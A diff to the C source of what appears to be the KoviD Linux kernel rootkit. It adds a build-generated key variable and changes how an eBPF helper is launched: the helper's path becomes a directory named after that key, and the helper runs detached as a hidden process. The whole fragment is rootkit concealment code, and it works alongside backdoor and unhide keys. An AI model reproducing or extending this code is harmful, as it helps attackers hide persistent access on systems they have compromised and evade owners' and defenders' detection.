@@ -66,6 +66,7 @@ static struct kv_crypto_st *kvmgc_unhidekey;
 
 // Makefile auto-generated - DO NOT EDIT
 uint64_t auto_unhidekey = 0x0000000000000000;
+uint64_t auto_ebpfhidenkey = 0x0000000000000000;
 
 extern uint64_t auto_bdkey;
 
@@ -640,13 +641,16 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 		} break;
 #ifdef CONFIG_BPF
 		case Opt_exec_epbf: {
-			static char *cmd[] = { "/usr/bin/ebpf-kovid", NULL,
-					       NULL };
-			int ret;
+			static char cmdPath[128] = { 0 };
+			snprintf(cmdPath, sizeof(cmdPath),
+				 "/usr/bin/0x%llx/ebpf-kovid",
+				 (unsigned long long)auto_ebpfhidenkey);
+
+			static char *cmd[] = { cmdPath, NULL, NULL };
 
 			/* Use the *detached* version so we don't block */
 			/* In addition, hide the process.*/
-			ret = kv_run_system_command(cmd, true, true);
+			int ret = kv_run_system_command(cmd, true, true);
 			if (ret == 0) {
 				prinfo("KoviD: Launched ebpf-kovid in background.\n");
 			} else {
